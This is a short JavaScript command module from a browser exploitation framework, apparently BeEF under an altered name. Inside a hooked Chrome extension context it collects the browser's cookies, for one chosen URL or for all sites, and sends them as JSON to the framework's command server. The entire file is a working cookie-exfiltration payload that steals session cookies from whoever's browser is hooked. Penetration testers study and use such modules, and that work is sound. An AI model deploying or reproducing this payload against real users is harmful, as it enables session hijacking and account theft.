//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	the_url = "<%== @url %>";
	if (the_url != 'default_all') {
	    chrome.cookies.getAll({url:the_url}, function(cookies){
	        server.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
	    })
	} else {
		chrome.cookies.getAll({}, function(cookies){
        	server.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
    	})
	}

});

